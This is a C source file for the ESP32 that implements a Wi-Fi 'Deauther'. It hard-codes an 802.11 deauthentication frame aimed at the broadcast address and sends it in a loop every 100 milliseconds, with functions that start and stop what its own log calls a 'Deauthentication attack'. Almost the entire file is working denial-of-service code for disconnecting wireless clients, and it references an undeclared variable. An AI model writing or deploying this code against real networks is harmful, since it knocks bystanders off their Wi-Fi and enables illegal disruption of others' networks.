#include <stdio.h>
#include <string.h>
#include "esp_event.h"
#include "esp_err.h"
#include "freertos/task.h"
#include "esp_event.h"
#include "esp_netif.h"
#include "nvs_flash.h"
#include "esp_wifi.h"
#include "esp_log.h"
#include "esp_ui.h"

char * TAG = "Deauther";
bool stopDeauth = true;

uint8_t deauth_frame[] = {
    // frame control start
    0xc0, 0x00, //type and subtype, to/fromDS
    // frame control end
    0x00, 0x01, //duration ID
    0xff, 0xff, 0xff, 0xff, 0xff, 0xff, // destination address (broadcast)
    0x48, 0xe7, 0x29, 0x98, 0x0b, 0x7d, // source address of esp32
    0x00,0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00 // frame body

};

void deauth_start(){ 
	runningTasks++;
	stopDeauth = false;
	while(!stopDeauth){
		esp_err_t ret = esp_wifi_80211_tx(WIFI_IF_AP, &deauth_frame, sizeof(deauth_frame), false);
		if (ret == ESP_OK){
			ESP_LOGI(TAG, "Deauthentication packet sent...");
		}else{
			ESP_LOGI(TAG, "Deauthentication packet transmission unsuccessful...");
		}
		vTaskDelay(100/portTICK_PERIOD_MS);
	
	}
	vTaskDelete(NULL);

}

void deauth_stop(){
	runningTasks-= 1;
	stopDeauth = true;	
	ESP_ERROR_CHECK(esp_wifi_stop());
	ESP_LOGI(TAG, "Deauthentication attack stopped");
	vTaskDelete(NULL);
	
}



